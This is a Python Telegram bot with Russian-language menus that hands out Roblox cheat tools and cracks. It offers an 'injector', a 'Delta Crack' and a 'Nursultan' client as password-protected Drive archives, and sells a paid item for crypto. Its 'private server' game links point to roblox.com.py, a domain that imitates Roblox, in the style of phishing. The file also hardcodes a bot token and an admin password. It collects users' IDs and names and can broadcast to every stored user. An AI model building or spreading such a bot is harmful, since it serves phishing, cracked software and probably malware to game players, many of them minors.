import logging
import re
import sqlite3
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    filters, ConversationHandler, ContextTypes
)
from flask import Flask, render_template_string

# ---------- Настройки ----------
TOKEN = "8507411429:AAF8c0-osUfQpKyK_9t3HDNTEfjzHtpvvpM"
ADMIN_PASSWORD = "MiaWaster"

# Состояния ConversationHandler
WAITING_PASSWORD, ADMIN_PANEL, WAITING_BROADCAST = range(3)

# Ссылки и данные (добавлена ссылка на мульти-скрипт)
XENO_LINK = "https://drive.google.com/file/d/1NThU3E2ymUHdZpdxX7Lz0I9fhuNYIkvk/view?usp=sharing"
VIRUSTOTAL_LINK = "https://www.virustotal.com/gui/file/3926fafcbb47b2a568bd2c9314be648a589e5442609d49151af3aa5b140ed634?nocache=1"
ARCHIVE_PASSWORD = "123"

BRAINROT_LINK = "https://roblox.com.py/games/109983668079237/SOON-Steal-a-Brainrot?privateServerLinkCode=37302295613294756084518996604997"
GAG_LINK = "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=37302295613294756084518996604997"
MM2_LINK = "https://roblox.com.py/games/142823291/Murder-Mystery-2?privateServerLinkCode=37302295613294756084518996604997"
ADOPT_LINK = "https://roblox.com.py/games/920587237/3X-NOW-Adopt-Me?privateServerLinkCode=37302295613294756084518996604997"

NURSULTAN_LINK = "https://drive.google.com/file/d/11UmtVGJVNn4e3eEOZa1j88JC06tXnXmb/view?usp=sharing"
DELTA_CRACK_LINK = "https://drive.google.com/file/d/1qgmCrTZoXTdTJ3QHELo6cL7M_Ycsoenh/view?usp=sharing"

# NightDLS
NIGHTDLS_PRICE = "50 рублей"
NIGHTDLS_WALLET = "UQBkoV5I0N3xAIzRX6NuObrekTYEgLXfsC0E4JFdnK9-RN-s"
NIGHTDLS_LINK = "https://drive.google.com/file/d/1EbLFxIqHDpY85W1g-X4x178FzNExMhu8/view?usp=sharing"

# Новая ссылка на покупку мульти-скрипта
MULTISCRIPT_CONTACT = "https://t.me/ASqwertASclient"

# Глобальные переменные
admin_chat_id = None
forward_messages_enabled = False
new_user_notifications_enabled = False
pending_payments = {}

# ---------- База данных SQLite ----------
DB_PATH = "bot_database.db"

def init_db():
    """Создаёт таблицу users, если её нет."""
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            joined TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name):
    """Добавляет пользователя в БД, если его ещё нет. Возвращает True, если пользователь новый."""
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT id FROM users WHERE id = ?", (user_id,))
    exists = cur.fetchone()
    if not exists:
        cur.execute(
            "INSERT INTO users (id, username, first_name) VALUES (?, ?, ?)",
            (user_id, username, first_name)
        )
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def get_all_users():
    """Возвращает список всех ID пользователей."""
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT id FROM users")
    rows = cur.fetchall()
    conn.close()
    return [row[0] for row in rows]

def get_user_count():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM users")
    count = cur.fetchone()[0]
    conn.close()
    return count

def get_users_page(page=1, page_size=10):
    """Возвращает список (id, username, first_name) для страницы."""
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    offset = (page - 1) * page_size
    cur.execute(
        "SELECT id, username, first_name FROM users ORDER BY id LIMIT ? OFFSET ?",
        (page_size, offset)
    )
    rows = cur.fetchall()
    conn.close()
    return rows

# ---------- Логирование ----------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------- Вспомогательные функции ----------
async def save_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Сохраняет пользователя в БД и уведомляет админа, если он новый."""
    global admin_chat_id, new_user_notifications_enabled
    user = update.effective_user
    if not user:
        return
    user_id = user.id
    username = user.username
    first_name = user.first_name
    is_new = add_user(user_id, username, first_name)
    if is_new and new_user_notifications_enabled and admin_chat_id:
        try:
            await context.bot.send_message(
                chat_id=admin_chat_id,
                text=f"🆕 <b>Новый пользователь!</b>\n"
                     f"Имя: {first_name}\n"
                     f"Username: @{username if username else 'отсутствует'}\n"
                     f"ID: <code>{user_id}</code>",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"Не удалось отправить уведомление админу: {e}")

def get_user_list_text(page=1, page_size=10):
    """Текст со списком пользователей (из БД)."""
    users = get_users_page(page, page_size)
    total = get_user_count()
    lines = [f"👥 <b>Список пользователей (страница {page}):</b>\n"]
    for i, (uid, uname, fname) in enumerate(users, start=(page-1)*page_size+1):
        uname_str = f"@{uname}" if uname else "—"
        lines.append(f"{i}. <code>{uid}</code> {fname} ({uname_str})")
    lines.append(f"\nВсего: {total}")
    return "\n".join(lines)

# ---------- Клавиатуры ----------
def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("💉 Xeno Injector", callback_data="xeno")],
        [InlineKeyboardButton("🧠 Urkadi Brainrot Раздача", callback_data="brainrot_menu")],
        [InlineKeyboardButton("👤 Nursultan", callback_data="nursultan")],
        [InlineKeyboardButton("🔓 Delta Crack", callback_data="delta")],
        [InlineKeyboardButton("🛒 Shop", callback_data="shop")],
        [InlineKeyboardButton("📦 Мульти-скрипт Roblox", callback_data="multiscript")],  # новая кнопка
    ]
    return InlineKeyboardMarkup(keyboard)

def brainrot_submenu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🧠 Brainrot", callback_data="brainrot_game")],
        [InlineKeyboardButton("🤣 GAG", callback_data="gag_game")],
        [InlineKeyboardButton("🔪 MM2", callback_data="mm2_game")],
        [InlineKeyboardButton("🐾 Adopt Me", callback_data="adopt_game")],
        [InlineKeyboardButton("◀️ Назад", callback_data="back_to_main")],
    ]
    return InlineKeyboardMarkup(keyboard)

def back_button():
    keyboard = [[InlineKeyboardButton("◀️ Назад в главное меню", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(keyboard)

def back_to_brainrot_menu():
    keyboard = [[InlineKeyboardButton("◀️ Назад к списку игр", callback_data="back_to_brainrot")]]
    return InlineKeyboardMarkup(keyboard)

def admin_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("📨 Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton("👥 Список пользователей", callback_data="admin_list_users")],
        [InlineKeyboardButton("📩 Пересылка сообщений", callback_data="admin_toggle_forward")],
        [InlineKeyboardButton("🔔 Уведомления о новых", callback_data="admin_toggle_notify")],
        [InlineKeyboardButton("🌐 Открыть сайт", callback_data="admin_show_site")],   # новая кнопка
        [InlineKeyboardButton("🚪 Выйти", callback_data="admin_exit")],
    ]
    return InlineKeyboardMarkup(keyboard)

def shop_keyboard():
    keyboard = [
        [InlineKeyboardButton("✅ Я оплатил", callback_data="pay_nightdls")],
        [InlineKeyboardButton("◀️ Назад", callback_data="back_to_main")],
    ]
    return InlineKeyboardMarkup(keyboard)

def users_list_keyboard(page, total_pages):
    buttons = []
    if page > 1:
        buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"users_page_{page-1}"))
    if page < total_pages:
        buttons.append(InlineKeyboardButton("Вперёд ▶️", callback_data=f"users_page_{page+1}"))
    if buttons:
        return InlineKeyboardMarkup([buttons, [InlineKeyboardButton("◀️ В админ-панель", callback_data="back_to_admin_panel")]])
    else:
        return InlineKeyboardMarkup([[InlineKeyboardButton("◀️ В админ-панель", callback_data="back_to_admin_panel")]])

# ---------- Обработчики команд и кнопок ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await save_user(update, context)
    await update.message.reply_text(
        "✨ <b>Добро пожаловать!</b>\n\n"
        "Я помогу тебе скачать нужные файлы и получить ссылки на раздачи.\n"
        "Выбери раздел ниже:",
        parse_mode="HTML",
        reply_markup=main_menu_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await save_user(update, context)

    data = query.data

    if data == "xeno":
        text = (
            f"💉 <b>Xeno Injector</b>\n\n"
            f"🔗 <b>Ссылка для скачивания:</b>\n{XENO_LINK}\n\n"
            f"🔐 <b>Пароль от архива:</b> <code>{ARCHIVE_PASSWORD}</code>\n\n"
            f"🛡 <b>Отчёт VirusTotal:</b>\n{VIRUSTOTAL_LINK}"
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_button())

    elif data == "brainrot_menu":
        await query.edit_message_text(
            "🎮 <b>Выберите игру</b> для получения приватной ссылки на раздачу:",
            parse_mode="HTML",
            reply_markup=brainrot_submenu_keyboard()
        )

    elif data == "brainrot_game":
        await query.edit_message_text(
            f"🧠 <b>Brainrot (SOON)</b>\n\n🔗 <b>Ссылка:</b>\n{BRAINROT_LINK}",
            parse_mode="HTML", reply_markup=back_to_brainrot_menu()
        )

    elif data == "gag_game":
        await query.edit_message_text(
            f"🤣 <b>Grow a Garden (GAG)</b>\n\n🔗 <b>Ссылка:</b>\n{GAG_LINK}",
            parse_mode="HTML", reply_markup=back_to_brainrot_menu()
        )

    elif data == "mm2_game":
        await query.edit_message_text(
            f"🔪 <b>Murder Mystery 2</b>\n\n🔗 <b>Ссылка:</b>\n{MM2_LINK}",
            parse_mode="HTML", reply_markup=back_to_brainrot_menu()
        )

    elif data == "adopt_game":
        await query.edit_message_text(
            f"🐾 <b>Adopt Me</b>\n\n🔗 <b>Ссылка:</b>\n{ADOPT_LINK}",
            parse_mode="HTML", reply_markup=back_to_brainrot_menu()
        )

    elif data == "nursultan":
        await query.edit_message_text(
            f"👤 <b>Nursultan</b>\n\n"
            f"🔗 <b>Ссылка для скачивания:</b>\n{NURSULTAN_LINK}\n\n"
            f"🔐 <b>Пароль от архива:</b> <code>{ARCHIVE_PASSWORD}</code>",
            parse_mode="HTML", reply_markup=back_button()
        )

    elif data == "delta":
        await query.edit_message_text(
            f"🔓 <b>Delta Crack</b>\n\n"
            f"🔗 <b>Ссылка для скачивания:</b>\n{DELTA_CRACK_LINK}\n\n"
            f"🔐 <b>Пароль от архива:</b> <code>{ARCHIVE_PASSWORD}</code>",
            parse_mode="HTML", reply_markup=back_button()
        )

    elif data == "shop":
        text = (
            f"🛒 <b>Магазин</b>\n\n"
            f"💎 <b>NightDLS</b>\n"
            f"Цена: {NIGHTDLS_PRICE}\n"
            f"Крипто бот @CryptoBot Кошелек t.me/send?start=IVuNNEpWQ41z  для оплаты (крипто) t.me/send?start=IVuNNEpWQ41z:\n<code>{NIGHTDLS_WALLET}</code>\n\n"
            f"После оплаты нажми кнопку «✅ Я оплатил» и ожидай подтверждения. "
            f"Ссылка придёт в личное сообщение."
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=shop_keyboard())

    elif data == "multiscript":
        text = (
            "📦 <b>Мульти-скрипт Roblox</b>\n\n"
            "Для приобретения мульти-скрипта свяжитесь с продавцом по ссылке:\n"
            f"{MULTISCRIPT_CONTACT}\n\n"
            "После покупки вы получите инструкции по использованию."
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_button())

    elif data == "pay_nightdls":
        user_id = query.from_user.id
        user = query.from_user
        if admin_chat_id:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Подтвердить", callback_data=f"confirm_pay_{user_id}"),
                 InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_pay_{user_id}")]
            ])
            msg = await context.bot.send_message(
                chat_id=admin_chat_id,
                text=f"💰 <b>Запрос на оплату NightDLS</b>\n"
                     f"Пользователь: {user.full_name}\n"
                     f"Username: @{user.username if user.username else 'отсутствует'}\n"
                     f"ID: <code>{user_id}</code>\n\n"
                     f"Подтвердите получение оплаты.",
                parse_mode="HTML",
                reply_markup=keyboard
            )
            pending_payments[user_id] = msg.message_id
            await query.edit_message_text(
                "✅ Запрос отправлен администратору. Ожидайте подтверждения оплаты.\n"
                "Ссылка придёт в этот чат.",
                reply_markup=back_button()
            )
        else:
            await query.edit_message_text(
                "❌ Администратор не в сети. Попробуйте позже.",
                reply_markup=back_button()
            )

    elif data.startswith("confirm_pay_"):
        user_id = int(data.split("_")[2])
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"✅ <b>Оплата подтверждена!</b>\n\n"
                     f"🔗 Ссылка на NightDLS:\n{NIGHTDLS_LINK}",
                parse_mode="HTML"
            )
            await query.edit_message_text(
                text=query.message.text + "\n\n✅ Ссылка отправлена пользователю.",
                reply_markup=None
            )
        except Exception as e:
            await query.edit_message_text(
                text=query.message.text + f"\n\n❌ Не удалось отправить пользователю: {e}",
                reply_markup=None
            )
        if user_id in pending_payments:
            del pending_payments[user_id]

    elif data.startswith("reject_pay_"):
        user_id = int(data.split("_")[2])
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text="❌ <b>Оплата не подтверждена.</b>\n\n"
                     "Возможно, платёж не поступил или произошла ошибка.\n"
                     "Попробуйте ещё раз или свяжитесь с поддержкой.",
                parse_mode="HTML"
            )
            await query.edit_message_text(
                text=query.message.text + "\n\n❌ Оплата отклонена, пользователь уведомлен.",
                reply_markup=None
            )
        except Exception as e:
            await query.edit_message_text(
                text=query.message.text + f"\n\n❌ Не удалось уведомить пользователя: {e}",
                reply_markup=None
            )
        if user_id in pending_payments:
            del pending_payments[user_id]

    elif data == "back_to_main":
        await query.edit_message_text(
            "✨ <b>Главное меню</b>\n\nВыбери раздел:",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data == "back_to_brainrot":
        await query.edit_message_text(
            "🎮 <b>Выберите игру</b> для получения приватной ссылки на раздачу:",
            parse_mode="HTML",
            reply_markup=brainrot_submenu_keyboard()
        )

# ---------- Админ-панель ----------
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global admin_chat_id
    admin_chat_id = update.effective_chat.id
    await update.message.reply_text(
        "🔐 Введите пароль для доступа к панели администратора:"
    )
    return WAITING_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == ADMIN_PASSWORD:
        await update.message.reply_text(
            "✅ Пароль верен. Добро пожаловать в админ-панель!",
            reply_markup=admin_panel_keyboard()
        )
        return ADMIN_PANEL
    else:
        await update.message.reply_text("❌ Неверный пароль.")
        return ConversationHandler.END

async def admin_panel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global forward_messages_enabled, new_user_notifications_enabled
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "admin_broadcast":
        await query.edit_message_text(
            "📨 Отправьте сообщение для рассылки всем пользователям.\n"
            "Это может быть текст, фото, видео и т.д. Я перешлю его как есть."
        )
        return WAITING_BROADCAST

    elif data == "admin_stats":
        count = get_user_count()
        await query.edit_message_text(
            f"📊 <b>Статистика</b>\n\n"
            f"👥 Всего пользователей: <b>{count}</b>",
            parse_mode="HTML",
            reply_markup=admin_panel_keyboard()
        )
        return ADMIN_PANEL

    elif data == "admin_list_users":
        page = 1
        total = get_user_count()
        page_size = 10
        total_pages = (total + page_size - 1) // page_size if total > 0 else 1
        text = get_user_list_text(page, page_size)
        await query.edit_message_text(
            text,
            parse_mode="HTML",
            reply_markup=users_list_keyboard(page, total_pages)
        )
        return ADMIN_PANEL

    elif data.startswith("users_page_"):
        page = int(data.split("_")[2])
        total = get_user_count()
        page_size = 10
        total_pages = (total + page_size - 1) // page_size if total > 0 else 1
        text = get_user_list_text(page, page_size)
        await query.edit_message_text(
            text,
            parse_mode="HTML",
            reply_markup=users_list_keyboard(page, total_pages)
        )
        return ADMIN_PANEL

    elif data == "back_to_admin_panel":
        await query.edit_message_text(
            "Админ-панель:",
            reply_markup=admin_panel_keyboard()
        )
        return ADMIN_PANEL

    elif data == "admin_toggle_forward":
        forward_messages_enabled = not forward_messages_enabled
        status = "включена" if forward_messages_enabled else "выключена"
        await query.edit_message_text(
            f"📩 Пересылка сообщений от пользователей <b>{status}</b>.",
            parse_mode="HTML",
            reply_markup=admin_panel_keyboard()
        )
        return ADMIN_PANEL

    elif data == "admin_toggle_notify":
        new_user_notifications_enabled = not new_user_notifications_enabled
        status = "включены" if new_user_notifications_enabled else "выключены"
        await query.edit_message_text(
            f"🔔 Уведомления о новых пользователях <b>{status}</b>.",
            parse_mode="HTML",
            reply_markup=admin_panel_keyboard()
        )
        return ADMIN_PANEL

    elif data == "admin_show_site":
        await query.edit_message_text(
            "🌐 <b>Локальный сайт</b>\n\n"
            "Сайт доступен по адресу:\n"
            "http://127.0.0.1:5000\n\n"
            "Откройте эту ссылку в браузере на том же компьютере, где запущен бот.\n"
            "На сайте отображается статистика и список пользователей.",
            parse_mode="HTML",
            reply_markup=admin_panel_keyboard()
        )
        return ADMIN_PANEL

    elif data == "admin_exit":
        await query.edit_message_text(
            "🚪 Вы вышли из админ-панели. Возврат в главное меню.",
            reply_markup=main_menu_keyboard()
        )
        return ConversationHandler.END

async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    sent_count = 0
    failed_count = 0
    users = get_all_users()
    for user_id in users:
        try:
            await message.copy(chat_id=user_id)
            sent_count += 1
        except Exception as e:
            logger.warning(f"Не удалось отправить пользователю {user_id}: {e}")
            failed_count += 1
    await update.message.reply_text(
        f"✅ Рассылка завершена.\n"
        f"📨 Отправлено: {sent_count}\n"
        f"❌ Не удалось отправить: {failed_count}",
        reply_markup=admin_panel_keyboard()
    )
    return ADMIN_PANEL

# ---------- Обработка сообщений от пользователей ----------
async def handle_user_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global forward_messages_enabled, admin_chat_id

    await save_user(update, context)

    if admin_chat_id and update.effective_chat.id == admin_chat_id:
        if update.message.reply_to_message:
            reply_text = update.message.reply_to_message.text or update.message.reply_to_message.caption
            if reply_text and "ID:" in reply_text:
                match = re.search(r"ID:\s*(\d+)", reply_text)
                if match:
                    target_user_id = int(match.group(1))
                    try:
                        await update.message.copy(chat_id=target_user_id)
                        await update.message.reply_text("✅ Ответ отправлен пользователю.")
                    except Exception as e:
                        await update.message.reply_text(f"❌ Не удалось отправить: {e}")
        return

    if forward_messages_enabled and admin_chat_id:
        user = update.effective_user
        caption = (f"📨 <b>Сообщение от пользователя</b>\n"
                   f"Имя: {user.full_name}\n"
                   f"Username: @{user.username if user.username else 'отсутствует'}\n"
                   f"ID: <code>{user.id}</code>\n\n")
        try:
            await update.message.copy(
                chat_id=admin_chat_id,
                caption=caption + (update.message.caption or ""),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"Не удалось переслать сообщение админу: {e}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Действие отменено.")
    return ConversationHandler.END

# ---------- Flask сайт (локальный) ----------
def run_flask():
    app_flask = Flask(__name__)

    HTML_TEMPLATE = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Статистика бота</title>
        <style>
            body { font-family: Arial; margin: 40px; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
        </style>
    </head>
    <body>
        <h1>Статистика бота</h1>
        <p>Всего пользователей: <strong>{{ count }}</strong></p>
        <h2>Список пользователей</h2>
        <table>
            <tr><th>ID</th><th>Username</th><th>Имя</th><th>Дата регистрации</th></tr>
            {% for user in users %}
            <tr>
                <td>{{ user[0] }}</td>
                <td>@{{ user[1] if user[1] else '—' }}</td>
                <td>{{ user[2] }}</td>
                <td>{{ user[3] }}</td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """

    @app_flask.route("/")
    def index():
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT id, username, first_name, joined FROM users ORDER BY id")
        users = cur.fetchall()
        conn.close()
        count = len(users)
        return render_template_string(HTML_TEMPLATE, users=users, count=count)

    app_flask.run(host="127.0.0.1", port=5000, debug=False, threaded=True)

# ---------- Основная функция ----------
def main():
    init_db()  # инициализация БД

    # Запуск Flask в отдельном потоке
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    logger.info("Flask сайт запущен на http://127.0.0.1:5000")

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(?!admin_)"))

    admin_conv = ConversationHandler(
        entry_points=[CommandHandler("admin", admin_command)],
        states={
            WAITING_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
            ADMIN_PANEL: [CallbackQueryHandler(admin_panel_handler)],
            WAITING_BROADCAST: [MessageHandler(filters.ALL & ~filters.COMMAND, broadcast_message)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(admin_conv)

    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_user_message))

    logger.info("Бот запущен...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()